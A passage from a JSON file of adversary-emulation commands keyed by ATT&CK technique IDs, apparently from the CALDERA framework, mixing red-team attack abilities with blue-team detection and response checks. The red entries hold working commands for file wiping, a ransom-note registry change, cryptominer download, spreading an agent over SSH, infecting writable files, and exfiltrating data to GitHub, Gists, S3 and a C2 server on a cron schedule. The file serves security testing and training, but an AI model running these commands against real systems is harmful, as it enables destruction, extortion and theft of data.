         "command": "if (-not (Test-Path \"C:\\Users\\puma-4\\Desktop\\T1485.txt\")) { New-Item \"C:\\Users\\puma-4\\Desktop\\T1485.txt\" -Force }; & \"C:\\Users\\puma-4\\Desktop\\sdelete64.exe\" -accepteula \"C:\\Users\\puma-4\\Desktop\\T1485.txt\""
      }
   ],
   "T1491.001": [
      {
         "technique_id": "T1491.001",
         "technique_name": "Defacement: Internal Defacement",
         "tactic": "impact",
         "description": "Display ransom message to users at system start-up by configuring registry keys HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeCaption and HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeText.\n\n[SynAck Ransomware](https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/synack-ransomware-leverages-process-doppelg-nging-for-evasion-and-infection), \n[Grief Ransomware](https://redcanary.com/blog/grief-ransomware/), \n[Maze Ransomware](https://cyware.com/research-and-analysis/maze-ransomware-a-deadly-combination-of-data-theft-and-encryption-to-target-us-organizations-8f27),\n[Pysa Ransomware](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-destructive-pysa-ransomware),\n[Spook Ransomware](https://community.fortinet.com/t5/FortiEDR/Threat-Coverage-How-FortiEDR-protects-against-Spook-Ransomware/ta-p/204226),\n[DopplePaymer Ransomware](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Dopplepaymer&threatId=-2147221958),\n[Reedemer Ransomware](https://blog.cyble.com/2022/07/20/redeemer-ransomware-back-action/),\n[Kangaroo Ransomware](https://www.bleepingcomputer.com/news/security/the-kangaroo-ransomware-not-only-encrypts-your-data-but-tries-to-lock-you-out-of-windows/)\n",
         "command": "$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption).LegalNoticeCaption; $orgLegalNoticeText = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText).LegalNoticeText; $newLegalNoticeCaption = \"PYSA\"; $newLegalNoticeText = \"Hi Company, every byte on any types of your devices was encrypted. Don't try to use backups because it were encrypted too. To get all your data contact us:xxxx@onionmail.org\"; Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force; Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force"
      },
      {
         "technique_id": "T1491.001",
         "technique_name": "Defacement: Internal Defacement",
         "tactic": "impact",
         "description": "Downloads an image from a URL and sets it as the desktop wallpaper.\n",
         "command": "$url = \"#{url_of_wallpaper}\"; $imgLocation = \"#{wallpaper_location}\"; $orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\\Control Panel\\Desktop\\' -Name WallPaper).WallPaper; $orgWallpaper | Out-File -FilePath \"#{pointer_to_orginal_wallpaper}\"; $updateWallpapercode = @' ; using System.Runtime.InteropServices; namespace Win32{;     public class Wallpaper{ ;         [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] ;          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;          ;          public static void SetWallpaper(string thePath){ ;             SystemParametersInfo(20,0,thePath,3);         };     }; } ; '@; $wc = New-Object System.Net.WebClient  ; try{  ;     $wc.DownloadFile($url, $imgLocation);     add-type $updateWallpapercode ;     [Win32.Wallpaper]::SetWallpaper($imgLocation); } ; catch [System.Net.WebException]{  ;     Write-Host(\"Cannot download $url\") ;     add-type $updateWallpapercode ;     [Win32.Wallpaper]::SetWallpaper($imgLocation); } ; finally{    ;     $wc.Dispose()  ; }"
      }
   ],
   "T1496": [
      {
         "technique_id": "T1496",
         "technique_name": "Resource Hijacking",
         "tactic": "impact",
         "description": "This test simulates a high CPU load as you might observe during cryptojacking attacks.\nEnd the test by using CTRL/CMD+C to break.\n",
         "command": "yes > /dev/null"
      },
      {
         "technique_id": "T1496",
         "technique_name": "Resource Hijacking",
         "tactic": "impact",
         "description": "Download and execute Monero miner (xmrig) for 1 minute",
         "command": "wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz;\ntar -xf xmrig-6.11.2-linux-x64.tar.gz;\ntimeout 60 ./xmrig-6.11.2/xmrig;\n[ $? -eq 124 ]\n"
      },
      {
         "technique_id": "T1496",
         "technique_name": "Resource Hijacking",
         "tactic": "impact",
         "description": "Install sox and record microphone for n-seconds",
         "command": "brew install sox >/dev/null 2>&1;\nsox -d recording.wav trim 0 15 >/dev/null 2>&1;\n"
      }
   ],
   "x": [
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "verification",
         "description": "GameBoard plugin guid detection placeholder ability",
         "command": ";\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "verification",
         "description": "GameBoard plugin pid detection placeholder ability",
         "command": ";\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "response",
         "description": "Restore sensitive directories with their backups if they have been modified",
         "command": "directory=\"#{directory.sensitive.path}\";\nmkdir -p $directory;\nrm -r ${directory}/*;\ntar -xzf /tmp/sensitive_file_backups/#{directory.sensitive.backup} -C $directory;\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "response",
         "description": "Reroute suspicious IP addresses to localhost by editing hosts file",
         "command": "if ! test -f hosts_backup; then cp /etc/hosts hosts_backup; fi;\necho \"127.0.0.1    #{remote.suspicious.url}\" >> /etc/hosts;\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "response",
         "description": "Use hash of known suspicious file to find instances of said file, and delete instances",
         "command": "Remove-Item -Path #{host.malicious.file} -Force;\n"
      },
      {
         "technique_id": "x",
         "technique_name": "Query Event Logs",
         "tactic": "response",
         "description": "Collect all process creation events with the given parent process GUID",
         "command": "$time_range = (Get-Date) - (New-TimeSpan -Seconds $(#{sysmon.time.range}/1000));\nGet-WinEvent -FilterHashTable @{ Logname='Microsoft-Windows-Sysmon/Operational'; StartTime=$time_range; Id=1 } | where -Property Message -Match \"\\bParentProcessGuid: {#{host.process.parentguid}}\" | Format-List;\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "response",
         "description": "Removes newly added cron jobs",
         "command": "crontab -u #{host.user.name} -l > temp_crontab;\nline_number=$(grep -n '#{host.new.cronjob}' temp_crontab | cut -d':' -f1);\nif [ $line_number ]; then\n  sed \"${line_number}d\" temp_crontab > new_crontab;\n  crontab -u #{host.user.name} new_crontab;\n  rm -f new_crontab;\nfi;\nrm -f temp_crontab new_crontab;\n"
      },
      {
         "technique_id": "x",
         "technique_name": "Query Event Logs",
         "tactic": "response",
         "description": "Collect child processes from Sysmon logs",
         "command": "$time_range = (Get-Date) - (New-TimeSpan -Seconds $(#{sysmon.time.range}/1000));\nGet-WinEvent -FilterHashTable @{ Logname='Microsoft-Windows-Sysmon/Operational'; StartTime=$time_range; Id=1} | where -Property Message -Match '(?m)^ParentProcessGuid: {#{host.process.guid}}' | Format-List;\n"
      },
      {
         "technique_id": "x",
         "technique_name": "Query Event Logs",
         "tactic": "response",
         "description": "Collect system information from Sysmon event log given ProcessGUID. Ability timeout may need to be increased depending on Sysmon log size.",
         "command": "$time_range = (Get-Date) - (New-TimeSpan -Seconds $(#{sysmon.time.range}/1000));\nGet-WinEvent -FilterHashTable @{ Logname='Microsoft-Windows-Sysmon/Operational'; StartTime=$time_range; } | select TimeCreated,Id,ProviderName,RecordId,ProcessId,MachineName,Message | where -Property Message -Match \"\\bProcessGuid: {#{host.process.guid}}\" | Format-List;\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "response",
         "description": "Removes newly added scheduled tasks",
         "command": "Unregister-ScheduledTask -TaskName #{host.new.schtask} -Confirm:$false\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "response",
         "description": "Force kill any unauthorized processes",
         "command": "kill -9 #{host.pid.unauthorized}\n"
      },
      {
         "technique_id": "x",
         "technique_name": "Query Event Logs",
         "tactic": "response",
         "description": "Collect grandchild processes from Sysmon logs",
         "command": "$time_range = (Get-Date) - (New-TimeSpan -Seconds $(#{sysmon.time.range}/1000));\nGet-WinEvent -FilterHashTable @{ Logname='Microsoft-Windows-Sysmon/Operational'; StartTime=$time_range; Id=1} | where -Property Message -Match '(?m)^ParentProcessId: #{host.process.childid}\\b' | Format-List;\n"
      },
      {
         "technique_id": "x",
         "technique_name": "Query Event Logs",
         "tactic": "response",
         "description": "Collect process GUIDs by querying Sysmon for all events associated with the given PID",
         "command": "$time_range = (Get-Date) - (New-TimeSpan -Seconds $(#{sysmon.time.range}/1000));\nGet-WinEvent -FilterHashTable @{ Logname='Microsoft-Windows-Sysmon/Operational'; StartTime=$time_range; Id=1} | where -Property Message -Match '(?m)^ProcessId: #{host.process.id}\\b' | Format-List;\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "response",
         "description": "Restore backups of files if file has been modified",
         "command": "cp -f /tmp/sensitive_file_backups/#{file.backup.name} #{file.sensitive.path}\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "setup",
         "description": "Create compressed backups of sensitive directories",
         "command": "mkdir -p /tmp/sensitive_file_backups;\ndir_path=$(echo \"#{directory.sensitive.path}\" | sed 's/\\\\\\*/\\*/g');\ndirectories=$(find $dir_path -maxdepth 0 -type d 2>/dev/null);\noutput=\"\";\nfor directory in $directories;\n  do if [ -z \"$(ls -A $directory)\" ]; then\n    touch \"${directory}/.bak\";\n  fi;\n  randname=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13);\n  tar -czf /tmp/sensitive_file_backups/${randname}.tar.gz -C $directory .;\n  output=\"${output}${directory}>${randname}.tar.gz\\n\";\ndone;\necho $output | sed '/^[[:space:]]*$/d'\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "setup",
         "description": "If bash profile doesn't exist, create it, and then hash each profile.",
         "command": "mkdir -p /tmp/sensitive_file_backups;\nuser_profiles=\".bashrc .bash_profile .bash_login .profile\";\noutput=\"\";\nhome_dir=$(echo \"/home/*\" | sed 's/\\\\\\*/\\*/g');\ndirs=$(find $home_dir -maxdepth 0 -type d);\ndirs=\"${dirs} /root\";\nfiles=\"\";\nfor dir in $dirs;\n  do for prof in $user_profiles;\n    do files=\"${files}${dir}/${prof} \";\n  done;\ndone;\nfiles=\"${files} /etc/profile /etc/bash.bashrc\";\nfor file in $files;\n  do if [ ! -f $file ];\n    then touch $file;\n  fi;\n  hash=$(sha256sum $file | cut -d' ' -f1);\n  output=\"${output}${file}>${hash}\\n\";\ndone;\necho $output | sed '/^[[:space:]]*$/d'\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "setup",
         "description": "If bash profile doesn't exist, create it, and then backup each profile.",
         "command": "mkdir -p /tmp/sensitive_file_backups;\nuser_profiles=\".bashrc .bash_profile .bash_login .profile\";\noutput=\"\";\nhome_dir=$(echo \"/home/*\" | sed 's/\\\\\\*/\\*/g');\ndirs=$(find $home_dir -maxdepth 0 -type d);\ndirs=\"${dirs} /root\";\nfiles=\"\";\nfor dir in $dirs;\n  do for prof in $user_profiles;\n    do files=\"${files}${dir}/${prof} \";\n  done;\ndone;\nfiles=\"${files} /etc/profile /etc/bash.bashrc\";\nfor file in $files;\n  do if [ ! -f $file ];\n    then touch $file;\n  fi;\n  randname=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13);\n  cp $file /tmp/sensitive_file_backups/$randname;\n  output=\"${output}${file}>${randname}\\n\";\ndone;\necho $output | sed '/^[[:space:]]*$/d'\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "setup",
         "description": "This ability creates file hashes of Powershell profiles, creating the profiles themselves if they do not exist.",
         "command": "$files = @(\"$Profile\", \"$PsHome\\Profile.ps1\", \"$PsHome\\Microsoft.Powershell_profile.ps1\");\n$output = @();\nForEach ($file in $files) {\n  if (-not (Test-Path $file)) {\n    New-Item -Path $file -ItemType File | Out-Null;\n  };\n  $output += $(Get-FileHash $file -EA silentlycontinue | foreach-object {$_.Path + '>' + $_.Hash});\n};\n$output\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "setup",
         "description": "This ability creates backups of Powershell profiles, creating the profiles themselves if they do not exist.",
         "command": "$files = @(\"$Profile\", \"$PsHome\\Profile.ps1\", \"$PsHome\\Microsoft.Powershell_profile.ps1\");\nNew-Item -ItemType Directory -Force -Path C:\\Users\\Public\\sensitive_file_backups | Out-Null;\n$output = '';\nForEach ($file in $files) {\n  if (-not (Test-Path $file)) {\n    New-Item -Path $file -ItemType File | Out-Null;\n  };\n  $randname = -join (( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count 13 | % {[char]$_});\n  Copy-Item $file -Destination \"C:\\Users\\Public\\sensitive_file_backups\\$randname\";\n  $output = \"$($output)$($file)>$($randname)`n\"\n};\n$output\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "setup",
         "description": "Acquire hashes of sensitive files as a baseline to check if they are changed in the future",
         "command": "output=\"\";\nfilepath=$(echo \"#{file.sensitive.path}\" | sed 's/\\\\\\*/\\*/g');\nfiles=$(find $filepath -maxdepth 0 -type f 2>/dev/null);\nfor file in $files;\n  do hash=$(sha256sum $file | cut -d' ' -f1);\n  output=\"${output}${file}>${hash}\\n\";\ndone;\necho $output | sed '/^[[:space:]]*$/d'\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "setup",
         "description": "Backup sensitive files to temp directory in case these files are maliciously modified",
         "command": "mkdir -p /tmp/sensitive_file_backups;\nfilepath=$(echo \"#{file.sensitive.path}\" | sed 's/\\\\\\*/\\*/g');\nfiles=$(find $filepath -maxdepth 0 -type f 2>/dev/null);\noutput=\"\";\nfor file in $files;\n  do randname=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13);\n  cp $file /tmp/sensitive_file_backups/$randname;\n  output=\"${output}${file}>${randname}\\n\";\ndone;\necho $output | sed '/^[[:space:]]*$/d'\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "setup",
         "description": "Acquire hashes of compressed sensitive directories as a baseline to check if they are changed in the future",
         "command": "output=\"\";\ndir_path=$(echo \"#{directory.sensitive.path}\" | sed 's/\\\\\\*/\\*/g');\ndirectories=$(find $dir_path -maxdepth 0 -type d 2>/dev/null);\nfor directory in $directories;\n  do if [ -z \"$(ls -A $directory)\" ]; then\n    touch \"${directory}/.bak\";\n  fi;\n  tar -czf /tmp/dir_sens_comp -C $directory .;\n  hash=$(sha256sum /tmp/dir_sens_comp | cut -d' ' -f1);\n  output=\"${output}${directory}>${hash}\\n\";\n  rm -f /tmp/dir_sens_comp;\ndone;\necho $output | sed '/^[[:space:]]*$/d'\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "setup",
         "description": "Capture the cron jobs that exist at the start of the operation",
         "command": "echo '' > /tmp/cron_jobs;\nfor user in $(getent passwd | cut -f1 -d:); do\n  $(crontab -u $user -l 2>/dev/null | grep -v '\\#' | while read -r job; do\n    echo \"${user}>${job}\" >> /tmp/cron_jobs;\n  done);\ndone;\ncat /tmp/cron_jobs | sort > /tmp/baseline_cronjobs_list.txt;\nrm /tmp/cron_jobs;\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "setup",
         "description": "Capture the scheduled tasks that exist at the start of the operation",
         "command": "Get-ScheduledTask > C:\\Users\\Public\\baseline_schtasks_list.txt\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "hunt",
         "description": "Search for Sysmon Event 1 records to discover children of known processes.",
         "command": "process.parent.entity_id:\\{#{investigate.process.guid}\\} AND winlog.event_id:1 AND winlog.provider_name:\"Microsoft-Windows-Sysmon\"\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "hunt",
         "description": "Search for Sysmon Event 1 records to discover parents of known processes.",
         "command": "process.entity_id:\\{#{investigate.process.parent_guid}\\} AND winlog.event_id:1 AND winlog.provider_name:\"Microsoft-Windows-Sysmon\"\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "hunt",
         "description": "Search for Sysmon Event 1 powershell records with \"ExecutionPolicy\" and \"Bypass\"",
         "command": "process.name:powershell.exe AND process.args:*Bypass* AND process.args:*ExecutionPolicy*\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "detection",
         "description": "Checks to see if a new (unauthorized) scheduled task has been added",
         "command": "Get-ScheduledTask > C:\\Users\\Public\\new_schtasks_list.txt;\n$new_schtasks =  $(Get-Content .\\new_schtasks_list.txt) | Where-Object {$_ -notIn $(Get-Content .\\baseline_schtasks_list.txt)} |foreach-object {(-split $_)[1]};\nRemove-Item -Path C:\\Users\\Public\\new_schtasks_list.txt -Force;\n$new_schtasks\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "detection",
         "description": "Get information from AV about suspicious files",
         "command": "if (Test-Path C:\\Users\\Public\\malicious_files.txt -PathType Leaf) {\n  $hashes = Get-Content C:\\Users\\Public\\malicious_files.txt -Raw;\n  Remove-Item C:\\Users\\Public\\malicious_files.txt;\n  $hashes;\n}\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "detection",
         "description": "Search for processes which should not be on the host",
         "command": "ps aux | grep -v grep | grep #{remote.port.unauthorized} | awk '{print $2}'\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "detection",
         "description": "Checks sensitive file hashes against previously stored hashes to determine if the file has been modified",
         "command": "filepath=\"#{file.sensitive.path}\";\nif [ ! -f $filepath ] || [ \"$(sha256sum $filepath | cut -d' ' -f1)\" != \"#{file.sensitive.hash}\" ];\n  then echo $filepath;\nfi\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "detection",
         "description": "Finds suspicious URLs in received mail",
         "command": "find /var/mail -type f -exec grep \"From.*@.*\\..*\" {} \\; | cut -d'@' -f2 | cut -d' ' -f1 | sort --uniq\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "detection",
         "description": "Checks sensitive directory hashes against previously stored hashes to determine if the directory has been modified",
         "command": "directory=\"#{directory.sensitive.path}\";\nif [ -d $directory ];\n  then tar -czf /tmp/dir_sens_comp -C $directory .;\n  hash=$(sha256sum /tmp/dir_sens_comp | cut -d' ' -f1);\n  rm -f /tmp/dir_sens_comp;\n  if [ \"$hash\" != \"#{directory.sensitive.hash}\" ];\n    then echo $directory;\n  fi;\nelse echo $directory;\nfi;\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "detection",
         "description": "Checks to see if a new (unauthorized) cron job has been added",
         "command": "set -f;\nfor user in $(getent passwd | cut -f1 -d:); do\n  $(crontab -u $user -l 2>/dev/null | grep -v '\\#' | while read -r job; do\n    echo \"${user}>${job}\" >> /tmp/cron_jobs;\n  done);\ndone;\ncat /tmp/cron_jobs | sort > /tmp/new_cronjobs_list.txt;\nnew_jobs=$(comm -13 /tmp/baseline_cronjobs_list.txt /tmp/new_cronjobs_list.txt);\nrm -f /tmp/cron_jobs;\nrm -f /tmp/new_cronjobs_list.txt;\nIFS=$(echo '\\n');\necho $new_jobs;\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "hunt",
         "description": "Use hash of known suspicious file to find instances of said file on hosts",
         "command": "$paths = (Get-ChildItem #{file.search.directory} -Recurse -EA:SilentlyContinue | Get-FileHash -EA:SilentlyContinue |\nWhere-Object hash -eq #{file.malicious.hash} | foreach { $_.Path });\n$paths;\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "training",
         "description": "Certification ability to create a listening process on an unauthorized port",
         "command": "nc -nlv 7011 &\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "training",
         "description": "Create a pretend malicious file to be acted on",
         "command": "echo 'Malicious file' > C:\\Users\\Public\\malicious;\n(Get-FileHash C:\\Users\\Public\\malicious).Hash > C:\\Users\\Public\\malicious_files.txt\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "training",
         "description": "Certification ability to create a new cronjob or scheduled task",
         "command": "crontab -l > new_crontab;\necho '0 * * * * /bin/echo bad_cronjob' >> new_crontab;\ncrontab new_crontab;\nrm -f new_crontab;\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "training",
         "description": "Send an email with a pretend evil domain to be acted on",
         "command": "mv ./phish_email.txt /var/mail/victim\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "training",
         "description": "Add a line to the Bash or Powershell profile",
         "command": "touch ~/.bashrc;\necho '#Find this change!' >> ~/.bashrc;\n"
      },
      {
         "technique_id": "x",
         "technique_name": "x",
         "tactic": "training",
         "description": "Delete previously stored pretend malicious mail",
         "command": "rm -f /var/mail/victim"
      }
   ],
   "T1065": [
      {
         "technique_id": "T1065",
         "technique_name": "Uncommonly Used Port",
         "tactic": "response",
         "description": "Blocks inbound TCP and UDP traffic on a specific port",
         "command": "New-NetFirewallRule -DisplayName \"Block in-bound UDP traffic to port #{host.port.unauthorized} from PID #{host.pid.unauthorized}\" -Group \"Caldira\" -Direction Inbound -Protocol UDP -Action Block -LocalPort #{host.port.unauthorized};\nNew-NetFirewallRule -DisplayName \"Block in-bound TCP traffic to port #{host.port.unauthorized} from PID #{host.pid.unauthorized}\" -Group \"Caldira\" -Direction Inbound -Protocol TCP -Action Block -LocalPort #{host.port.unauthorized};\n"
      },
      {
         "technique_id": "T1065",
         "technique_name": "Uncommonly Used Port",
         "tactic": "response",
         "description": "Blocks outbound TCP and UDP traffic on a specific port",
         "command": "New-NetFirewallRule -DisplayName \"Block out-bound UDP traffic to port #{remote.port.unauthorized} from PID #{host.pid.unauthorized}\" -Group \"Caldira\" -Direction Outbound -Protocol UDP -Action Block -RemotePort #{remote.port.unauthorized};\nNew-NetFirewallRule -DisplayName \"Block out-bound TCP traffic to port #{remote.port.unauthorized} from PID #{host.pid.unauthorized}\" -Group \"Caldira\" -Direction Outbound -Protocol TCP -Action Block -RemotePort #{remote.port.unauthorized};\n"
      },
      {
         "technique_id": "T1065",
         "technique_name": "Uncommonly Used Port",
         "tactic": "detection",
         "description": "Compare open ports against a known baseline",
         "command": "function getFullList($portList){\n    $final = @();\n    foreach ($p in $portList) {\n        if ($p -like \"*-*\") {\n            $minmax = $p.Split(\"-\");\n            for ($i = ($minmax[0] -as [int]); $i -lt ($minmax[1] -as [int]); $i++) {\n                $final += ($i -as [string]);\n            };\n        } else {\n            $final += $p;\n        };\n    };\n    return $final;\n};\n$basePorts = @(\"135\",\"139\",\"389\",\"445\",\"636\",\"1000-5000\",\"9389\",\"49152-65535\");\n$allPorts = getFullList $basePorts;\n$pidToPort = @();\nforeach ($port in (Get-NetTCPConnection -RemoteAddress 0.0.0.0 -state Listen)){\n    if ($allPorts -notcontains $port.LocalPort){\n        $pidToPort += , @{pid=$port.OwningProcess;port=$port.LocalPort};\n    }\n};\n$pidToPort | ConvertTo-Json;\n"
      }
   ],
   "T1071": [
      {
         "technique_id": "T1071",
         "technique_name": "Standard Application Layer Protocol",
         "tactic": "command-and-control",
         "description": "A Blue Python agent that executes elasticsearch queries.",
         "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:elasticat.py\" -H \"platform:darwin\" $server/file/download > elasticat.py;\npip install requests;\npython elasticat.py --server=$server --es-host=\"http://127.0.0.1:9200\" --group=blue --minutes-since=60\n"
      }
   ],
   "T1021.004": [
      {
         "technique_id": "T1021.004",
         "technique_name": "Remote Services: SSH",
         "tactic": "lateral-movement",
         "description": "Copy 54ndc47 to remote host and start it, assumes target uses SSH keys and passwordless authentication",
         "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n"
      }
   ],
   "TA0007": [
      {
         "technique_id": "TA0007",
         "technique_name": "host discovery",
         "tactic": "discovery",
         "description": "Uses windows libraries to get FQDN of infected host",
         "command": "[System.Net.Dns]::GetHostByName($env:computerName).HostName"
      }
   ],
   "T1574.010": [
      {
         "technique_id": "T1574.010",
         "technique_name": "Hijack Execution Flow: Services File Permissions Weakness",
         "tactic": "privilege-escalation",
         "description": "Locate and infect files with weak but executable perms",
         "command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-darwin && sandcat.go-darwin\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"\n"
      }
   ],
   "T1497.003": [
      {
         "technique_id": "T1497.003",
         "technique_name": "Virtualization/Sandbox Evasion: Time Based Evasion",
         "tactic": "defense-evasion",
         "description": "Pause all operations to avoid making noise",
         "command": "sleep 60"
      }
   ],
   "T1567.001": [
      {
         "technique_id": "T1567.001",
         "technique_name": "Exfiltration to Code Repository",
         "tactic": "exfiltration",
         "description": "This ability will exfiltrate all files in a set staged directory to a repository in GitHub.\n",
         "command": "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\";\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\nLocalDirectory=#{host.dir.staged};\nHeader=\"Authorization: token $GHPAT\";\n\nfor file in $LocalDirectory/*.*; do\n  TempName=$(echo $file | sed \"s/ /-/g\")\n\tRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename \"$TempName\")\";\n\techo \"{\\\"message\\\":\\\"Committed $(basename $TempName) at: $(date)\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\":\\\"\" >/tmp/b64;\n  base64 -w 0 \"$file\" >>/tmp/b64;\n  echo \"\\\"}\" >>/tmp/b64;\n\tcontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\" -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\n  rm /tmp/b64;\ndone;\n"
      },
      {
         "technique_id": "T1567.001",
         "technique_name": "Exfiltration to Code Repository",
         "tactic": "exfiltration",
         "description": "This will exfiltrate a given compressed directory to a GitHub repository. It assumes that all the facts supplied are valid.",
         "command": "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\";\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\nLocalFile='#{host.dir.compress}';\nHeader=\"Authorization: token $GHPAT\";\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\necho \"{\\\"message\\\":\\\"Committed $RemoteName\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\":\\\"\" >/tmp/b64;\nbase64 -w 0 $LocalFile >>/tmp/b64;\necho \"\\\"}\" >>/tmp/b64;\ncontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\" -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\nrm /tmp/b64;\n"
      },
      {
         "technique_id": "T1567.001",
         "technique_name": "Exfiltration to Code Repository",
         "tactic": "exfiltration",
         "description": "This ability exfiltrates a compressed archive to Github Gists (Base64 Encoded). To reconstitute, save\nthe base64 string from the Gist and run ----\n(Powershell) [Convert]::FromBase64String($(Get-Content b64.txt)) | set-content archive.extension -encoding byte ----\n(Linux) cat b64.txt | base64 -d > archive.extension\n",
         "command": "GHUser=\"#{github.user.name}\";\nGHPAT=\"#{github.access.token}\";\nFileContent=$(base64 #{host.dir.compress});\nLocalFile='#{host.dir.compress}';\nRemoteFile=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ntmp_file=$(mktemp);\necho \"{\\\"public\\\": false,\\\"files\\\": {\\\"$RemoteFile\\\": {\\\"content\\\": \\\"${FileContent}\\\"}}}\" > $tmp_file;\ncurl --silent --output /dev/null --show-error --fail -X POST -d @$tmp_file -u $GHUser:$GHPAT https://api.github.com/gists;\nrm $tmp_file\n"
      }
   ],
   "T1537": [
      {
         "technique_id": "T1537",
         "technique_name": "Transfer Data to Cloud Account",
         "tactic": "exfiltration",
         "description": "Transfer the compressed archive from one S3 bucket to another S3 bucket via AWS CLI. It is assumed that the proper\npolicies and security rules are in place to allow reading from the source bucket and writing to the destination\nbucket.\n",
         "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;\n"
      }
   ],
   "T1029": [
      {
         "technique_id": "T1029",
         "technique_name": "Scheduled Transfer",
         "tactic": "exfiltration",
         "description": "This ability exfiltrates the staged directory at a scheduled time.",
         "command": "crontab -l > /tmp/origcron;\ncrontab -l > /tmp/mycron;\necho \"0 12 * * * curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\" >> /tmp/mycron;\ncrontab /tmp/mycron;\n"
      }
   ],
   "T1565.001": [
      {
         "technique_id": "T1565.001",
